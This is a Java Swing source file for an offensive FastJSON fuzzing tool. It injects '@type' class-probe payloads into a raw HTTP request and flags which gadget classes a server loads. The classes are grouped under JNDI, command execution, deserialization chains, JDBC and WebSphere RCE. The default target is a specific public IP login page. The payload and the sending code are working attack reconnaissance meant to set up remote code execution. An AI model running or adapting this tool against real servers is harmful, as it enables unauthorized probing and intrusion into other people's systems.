package me.jiu;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.core.util.StrUtil;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import javax.swing.text.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.*;
import java.util.List;
import java.util.concurrent.CompletableFuture;

public class App extends JFrame {

    // GUI组件
    private JTextArea requestTextArea;
    private JTextField fuzzPositionField;
    private JTextField vulnerabilityPatternField;
    private JTextField targetUrlField;
    private JTextField proxyHostField;
    private JTextField proxyPortField;
    private JTextField timeoutField;
    private JTextPane resultTextPane;
    private JButton startTestButton;
    private JButton clearResultButton;
    private JComboBox<String> categoryComboBox;
    private JComboBox<String> methodComboBox;
    private JProgressBar progressBar;
    private JLabel statusLabel;
    
    // 样式
    private StyledDocument doc;
    private Style defaultStyle;
    private Style errorStyle;
    private Style vulnerableStyle;
    private Style safeStyle;
    private Style headerStyle;
    private Style testingStyle;

    // 测试相关
    private volatile boolean isTestRunning = false;

    public App() {
        // 设置全局字体
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
            Font defaultFont = new Font("宋体", Font.PLAIN, 12);
            UIManager.put("Label.font", defaultFont);
            UIManager.put("TextField.font", defaultFont);
            UIManager.put("TextArea.font", defaultFont);
            UIManager.put("Button.font", defaultFont);
            UIManager.put("ComboBox.font", defaultFont);
            UIManager.put("TitledBorder.font", defaultFont);
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        initializeGUI();
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setTitle("FastJSON依赖FUZZ工具 GUI版");
        setSize(1200, 800);
        setLocationRelativeTo(null);
    }

    private void initializeGUI() {
        setLayout(new BorderLayout());

        // 创建主面板
        JPanel mainPanel = new JPanel(new BorderLayout(10, 10));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // 创建顶部配置面板
        JPanel configPanel = createConfigPanel();

        // 创建中间内容面板
        JPanel contentPanel = createContentPanel();

        // 创建底部控制面板
        JPanel controlPanel = createControlPanel();

        mainPanel.add(configPanel, BorderLayout.NORTH);
        mainPanel.add(contentPanel, BorderLayout.CENTER);
        mainPanel.add(controlPanel, BorderLayout.SOUTH);

        add(mainPanel);
        
        // 添加方法选择监听器
        methodComboBox.addActionListener(e -> updateRequestMethod());
    }

    private JPanel createConfigPanel() {
        JPanel configPanel = new JPanel(new GridBagLayout());
        configPanel.setBorder(new TitledBorder("配置参数"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);

        // 目标URL
        gbc.gridx = 0; gbc.gridy = 0; gbc.anchor = GridBagConstraints.WEST;
        configPanel.add(new JLabel("目标URL:"), gbc);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 1.0;
        targetUrlField = new JTextField("http://142.171.65.181/login");
        configPanel.add(targetUrlField, gbc);

        // 代理设置
        gbc.gridx = 2; gbc.weightx = 0; gbc.fill = GridBagConstraints.NONE;
        configPanel.add(new JLabel("代理Host:"), gbc);
        gbc.gridx = 3; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.3;
        proxyHostField = new JTextField("127.0.0.1");
        configPanel.add(proxyHostField, gbc);

        gbc.gridx = 4; gbc.weightx = 0; gbc.fill = GridBagConstraints.NONE;
        configPanel.add(new JLabel("端口:"), gbc);
        gbc.gridx = 5; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.2;
        proxyPortField = new JTextField("7890");
        configPanel.add(proxyPortField, gbc);

        // 第二行
        gbc.gridx = 0; gbc.gridy = 1; gbc.anchor = GridBagConstraints.WEST; gbc.weightx = 0; gbc.fill = GridBagConstraints.NONE;
        configPanel.add(new JLabel("FUZZ位置:"), gbc);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 1.0;
        fuzzPositionField = new JTextField("FUZZ");
        configPanel.add(fuzzPositionField, gbc);

        // 请求方法选择
        gbc.gridx = 2; gbc.weightx = 0; gbc.fill = GridBagConstraints.NONE;
        configPanel.add(new JLabel("请求方法:"), gbc);
        gbc.gridx = 3; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.3;
        String[] methods = {"POST", "GET"};
        methodComboBox = new JComboBox<>(methods);
        configPanel.add(methodComboBox, gbc);

        gbc.gridx = 4; gbc.weightx = 0; gbc.fill = GridBagConstraints.NONE;
        configPanel.add(new JLabel("漏洞特征:"), gbc);
        gbc.gridx = 5; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.2;
        vulnerabilityPatternField = new JTextField("can not cast to char");
        configPanel.add(vulnerabilityPatternField, gbc);

        // 第三行 - 超时设置
        gbc.gridx = 0; gbc.gridy = 2; gbc.anchor = GridBagConstraints.WEST; gbc.weightx = 0; gbc.fill = GridBagConstraints.NONE;
        configPanel.add(new JLabel("超时(ms):"), gbc);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.3;
        timeoutField = new JTextField("20000");
        configPanel.add(timeoutField, gbc);

        // 测试类别选择
        gbc.gridx = 2; gbc.anchor = GridBagConstraints.WEST; gbc.weightx = 0; gbc.fill = GridBagConstraints.NONE;
        configPanel.add(new JLabel("测试类别:"), gbc);
        gbc.gridx = 3; gbc.gridwidth = 3; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.7;
        String[] categories = {"全部类别", "JNDI类", "字节码&命令执行", "文件读写", "反序列化利用链", "JDBC相关",
                "WebSphere RCE", "XXE与文件写入", "辅助依赖环境判断"};
        categoryComboBox = new JComboBox<>(categories);
        configPanel.add(categoryComboBox, gbc);

        return configPanel;
    }

    private JPanel createContentPanel() {
        JPanel contentPanel = new JPanel(new GridLayout(1, 2, 10, 0));

        // 左侧面板 - HTTP请求输入
        JPanel leftPanel = new JPanel(new BorderLayout());
        leftPanel.setBorder(new TitledBorder("HTTP请求数据包"));

        requestTextArea = new JTextArea();
        requestTextArea.setFont(new Font("Consolas", Font.PLAIN, 12));
        requestTextArea.setText("POST /login HTTP/1.1\n" +
                "Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n" +
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool\n" +
                "Accept-Encoding: gzip, deflate, br\n" +
                "Content-Length: 106\n" +
                "Content-Type: application/json\n" +
                "Cache-Control: no-cache\n" +
                "Pragma: no-cache\n" +
                "Host: 142.171.65.181\n" +
                "Connection: keep-alive\n" +
                "\n" +
                "FUZZ");

        JScrollPane requestScrollPane = new JScrollPane(requestTextArea);
        requestScrollPane.setPreferredSize(new Dimension(500, 400));
        leftPanel.add(requestScrollPane, BorderLayout.CENTER);

        // 右侧面板 - 结果显示
        JPanel rightPanel = new JPanel(new BorderLayout());
        rightPanel.setBorder(new TitledBorder("测试结果"));

        resultTextPane = new JTextPane();
        resultTextPane.setFont(new Font("宋体", Font.PLAIN, 12));
        resultTextPane.setEditable(false);
        resultTextPane.setBackground(Color.BLACK);
        
        // 初始化文本样式
        doc = resultTextPane.getStyledDocument();
        
        defaultStyle = resultTextPane.addStyle("default", null);
        StyleConstants.setForeground(defaultStyle, Color.GREEN);
        
        vulnerableStyle = resultTextPane.addStyle("vulnerable", null);
        StyleConstants.setForeground(vulnerableStyle, Color.RED);
        StyleConstants.setBold(vulnerableStyle, true);
        
        safeStyle = resultTextPane.addStyle("safe", null);
        StyleConstants.setForeground(safeStyle, Color.GREEN);
        
        errorStyle = resultTextPane.addStyle("error", null);
        StyleConstants.setForeground(errorStyle, Color.YELLOW);
        
        headerStyle = resultTextPane.addStyle("header", null);
        StyleConstants.setForeground(headerStyle, Color.CYAN);
        StyleConstants.setBold(headerStyle, true);
        
        testingStyle = resultTextPane.addStyle("testing", null);
        StyleConstants.setForeground(testingStyle, Color.WHITE);

        JScrollPane resultScrollPane = new JScrollPane(resultTextPane);
        resultScrollPane.setPreferredSize(new Dimension(500, 400));
        rightPanel.add(resultScrollPane, BorderLayout.CENTER);

        contentPanel.add(leftPanel);
        contentPanel.add(rightPanel);

        return contentPanel;
    }

    private JPanel createControlPanel() {
        JPanel controlPanel = new JPanel(new BorderLayout());

        // 按钮面板
        JPanel buttonPanel = new JPanel(new FlowLayout());

        startTestButton = new JButton("开始测试");
        startTestButton.setPreferredSize(new Dimension(120, 35));
        startTestButton.addActionListener(new StartTestListener());

        clearResultButton = new JButton("清空结果");
        clearResultButton.setPreferredSize(new Dimension(120, 35));
        clearResultButton.addActionListener(e -> resultTextPane.setText(""));

        buttonPanel.add(startTestButton);
        buttonPanel.add(clearResultButton);

        // 状态面板
        JPanel statusPanel = new JPanel(new BorderLayout());

        progressBar = new JProgressBar();
        progressBar.setStringPainted(true);
        progressBar.setString("就绪");

        statusLabel = new JLabel("状态: 就绪");
        statusLabel.setBorder(BorderFactory.createEmptyBorder(5, 10, 5, 10));

        statusPanel.add(progressBar, BorderLayout.CENTER);
        statusPanel.add(statusLabel, BorderLayout.EAST);

        controlPanel.add(buttonPanel, BorderLayout.NORTH);
        controlPanel.add(statusPanel, BorderLayout.SOUTH);

        return controlPanel;
    }

    private class StartTestListener implements ActionListener {
        @Override
        public void actionPerformed(ActionEvent e) {
            if (isTestRunning) {
                // 停止测试
                isTestRunning = false;
                startTestButton.setText("开始测试");
                statusLabel.setText("状态: 测试已停止");
                progressBar.setString("已停止");
                return;
            }

            // 开始测试
            String targetUrl = targetUrlField.getText().trim();
            String fuzzPosition = fuzzPositionField.getText().trim();
            String vulnerabilityPattern = vulnerabilityPatternField.getText().trim();
            String requestData = requestTextArea.getText();

            if (StrUtil.isEmpty(targetUrl) || StrUtil.isEmpty(fuzzPosition) ||
                    StrUtil.isEmpty(vulnerabilityPattern) || StrUtil.isEmpty(requestData)) {
                JOptionPane.showMessageDialog(App.this,
                        "请填写完整的配置信息！", "参数错误", JOptionPane.ERROR_MESSAGE);
                return;
            }

            if (!requestData.contains(fuzzPosition)) {
                JOptionPane.showMessageDialog(App.this,
                        "HTTP请求数据包中未找到FUZZ位置标记！", "参数错误", JOptionPane.ERROR_MESSAGE);
                return;
            }

            isTestRunning = true;
            startTestButton.setText("停止测试");
            resultTextPane.setText("");

            // 在后台线程中执行测试
            CompletableFuture.runAsync(() -> runFuzzTest());
        }
    }

    private void runFuzzTest() {
        try {
            String selectedCategory = (String) categoryComboBox.getSelectedItem();
            Map<String, List<String>> gadgetClasses = Fuzz.GADGET_CLASSES;

            // 根据选择的类别筛选要测试的类
            Map<String, List<String>> testClasses = new HashMap<>();
            if ("全部类别".equals(selectedCategory)) {
                testClasses = gadgetClasses;
            } else {
                testClasses.put(selectedCategory, gadgetClasses.get(selectedCategory));
            }

            int totalClasses = testClasses.values().stream().mapToInt(List::size).sum();
            int currentCount = 0;

            SwingUtilities.invokeLater(() -> {
                progressBar.setMaximum(totalClasses);
                progressBar.setValue(0);
                statusLabel.setText("状态: 测试进行中...");
            });

            for (Map.Entry<String, List<String>> entry : testClasses.entrySet()) {
                if (!isTestRunning) break;

                String category = entry.getKey();
                List<String> classList = entry.getValue();

                SwingUtilities.invokeLater(() -> {
                    appendResult("====== " + category + " 测试开始 ======\n");
                });

                for (String className : classList) {
                    if (!isTestRunning) break;

                    currentCount++;
                    final int count = currentCount;

                    SwingUtilities.invokeLater(() -> {
                        progressBar.setValue(count);
                        progressBar.setString("测试进度: " + count + "/" + totalClasses);
                        appendResult("正在测试: " + className + "\n");
                    });

                    try {
                        String result = testSingleClass(className);
                        SwingUtilities.invokeLater(() -> {
                            appendResult(result + "\n");
                        });
                    } catch (Exception ex) {
                        SwingUtilities.invokeLater(() -> {
                            appendResult("测试出错: " + ex.getMessage() + "\n");
                        });
                    }

                    // 短暂延迟，避免请求过快
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException ex) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }

                SwingUtilities.invokeLater(() -> {
                    appendResult("====== " + category + " 测试完成 ======\n\n");
                });
            }

        } catch (Exception ex) {
            SwingUtilities.invokeLater(() -> {
                appendResult("测试过程中发生错误: " + ex.getMessage() + "\n");
            });
        } finally {
            SwingUtilities.invokeLater(() -> {
                isTestRunning = false;
                startTestButton.setText("开始测试");
                statusLabel.setText("状态: 测试完成");
                progressBar.setString("测试完成");
            });
        }
    }

    private String testSingleClass(String className) {
        try {
            // 构造payload
            String payload = "{\"x\":{\"@type\":\"java.lang.Character\"{\"@type\":\"java.lang.Class\",\"val\":\"" + className + "\"}}";

            // 获取请求方法
            String method = (String) methodComboBox.getSelectedItem();
            boolean isGetMethod = "GET".equals(method);
            
            // 替换HTTP请求中的FUZZ位置
            String requestData = requestTextArea.getText();
            String fuzzPosition = fuzzPositionField.getText().trim();
            
            // 如果是GET请求，对payload进行URL编码
            String processedPayload = payload;
            if (isGetMethod) {
                try {
                    processedPayload = java.net.URLEncoder.encode(payload, "UTF-8");
                } catch (Exception e) {
                    appendResult("URL编码失败: " + e.getMessage() + "\n");
                }
            }
            
            String modifiedRequest = requestData.replace(fuzzPosition, processedPayload);

            // 解析HTTP请求
            String[] lines = modifiedRequest.split("\n");
            String requestLine = lines[0];
            String[] parts = requestLine.split(" ");
            String requestMethod = parts[0];
            String path = parts[1];

            // 构建完整URL
            String targetUrl = targetUrlField.getText().trim();
            String fullUrl;
            
            // 解析目标URL和路径，避免重复
            if (targetUrl.endsWith("/")) {
                targetUrl = targetUrl.substring(0, targetUrl.length() - 1);
            }
            
            if (path.startsWith("/")) {
                path = path.substring(1);
            }
            
            // 获取目标URL的基础部分（不含路径）
            String baseUrl;
            try {
                java.net.URL url = new java.net.URL(targetUrl);
                baseUrl = url.getProtocol() + "://" + url.getAuthority();
                fullUrl = baseUrl + "/" + path;
            } catch (Exception e) {
                // 如果解析失败，使用简单拼接
                fullUrl = targetUrl + "/" + path;
            }

            // 提取请求头和请求体
            Map<String, String> headers = new HashMap<>();
            StringBuilder bodyBuilder = new StringBuilder();
            boolean inBody = false;

            for (int i = 1; i < lines.length; i++) {
                String line = lines[i];
                if (line.trim().isEmpty()) {
                    inBody = true;
                    continue;
                }

                if (inBody) {
                    bodyBuilder.append(line).append("\n");
                } else {
                    int colonIndex = line.indexOf(":");
                    if (colonIndex > 0) {
                        String headerName = line.substring(0, colonIndex).trim();
                        String headerValue = line.substring(colonIndex + 1).trim();
                        headers.put(headerName, headerValue);
                    }
                }
            }

            String body = bodyBuilder.toString().trim();

            // 发送HTTP请求
            HttpRequest request;
            if ("POST".equalsIgnoreCase(requestMethod)) {
                request = HttpRequest.post(fullUrl);
                if (!body.isEmpty()) {
                    request.body(body);
                }
            } else if ("GET".equalsIgnoreCase(requestMethod)) {
                request = HttpRequest.get(fullUrl);
            } else {
                return "不支持的HTTP方法: " + requestMethod;
            }

            // 设置请求头
            for (Map.Entry<String, String> header : headers.entrySet()) {
                request.header(header.getKey(), header.getValue());
            }

            // 设置代理和超时
            String proxyHost = proxyHostField.getText().trim();
            String proxyPortStr = proxyPortField.getText().trim();
            String timeoutStr = timeoutField.getText().trim();

            if (!proxyHost.isEmpty() && !proxyPortStr.isEmpty()) {
                try {
                    int proxyPort = Integer.parseInt(proxyPortStr);
                    request.setHttpProxy(proxyHost, proxyPort);
                } catch (NumberFormatException ex) {
                    // 忽略代理设置错误
                }
            }

            try {
                int timeout = Integer.parseInt(timeoutStr);
                request.timeout(timeout);
            } catch (NumberFormatException ex) {
                request.timeout(20000); // 默认超时
            }

            // 执行请求
            HttpResponse response = request.execute();
            String responseBody = response.body();

            // 检查漏洞特征
            String vulnerabilityPattern = vulnerabilityPatternField.getText().trim();
            if (responseBody.contains(vulnerabilityPattern)) {
                return "[漏洞] " + className + " - 响应包含漏洞特征";
            } else {
                return "[安全] " + className + " - 未发现漏洞特征";
            }

        } catch (Exception ex) {
            return "[错误] " + className + " - " + ex.getMessage();
        }
    }

    private void appendResult(String text) {
        try {
            // 确保使用正确的字符编码
            String encodedText = new String(text.getBytes("UTF-8"), "UTF-8");
            
            // 根据内容选择样式
            Style style = defaultStyle;
            
            if (encodedText.contains("[漏洞]")) {
                style = vulnerableStyle;
            } else if (encodedText.contains("[安全]")) {
                style = safeStyle;
            } else if (encodedText.contains("[错误]")) {
                style = errorStyle;
            } else if (encodedText.contains("======")) {
                style = headerStyle;
            } else if (encodedText.contains("正在测试:")) {
                style = testingStyle;
            }
            
            // 添加文本
            try {
                doc.insertString(doc.getLength(), encodedText, style);
                resultTextPane.setCaretPosition(doc.getLength());
            } catch (BadLocationException e) {
                e.printStackTrace();
            }
            
        } catch (Exception e) {
            // 如果编码失败，使用默认样式添加原始文本
            try {
                doc.insertString(doc.getLength(), text, defaultStyle);
                resultTextPane.setCaretPosition(doc.getLength());
            } catch (BadLocationException ex) {
                ex.printStackTrace();
            }
        }
    }

    // 更新请求方法
    private void updateRequestMethod() {
        String selectedMethod = (String) methodComboBox.getSelectedItem();
        String requestData = requestTextArea.getText();
        String[] lines = requestData.split("\n");
        
        if (lines.length > 0) {
            String firstLine = lines[0];
            String[] parts = firstLine.split(" ");
            
            if (parts.length >= 3) {
                // 替换请求方法
                String newFirstLine = selectedMethod + " " + parts[1] + " " + parts[2];
                StringBuilder newRequestData = new StringBuilder(newFirstLine);
                
                // 添加剩余行
                for (int i = 1; i < lines.length; i++) {
                    newRequestData.append("\n").append(lines[i]);
                }
                
                requestTextArea.setText(newRequestData.toString());
            }
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(() -> {
            new App().setVisible(true);
        });
    }
}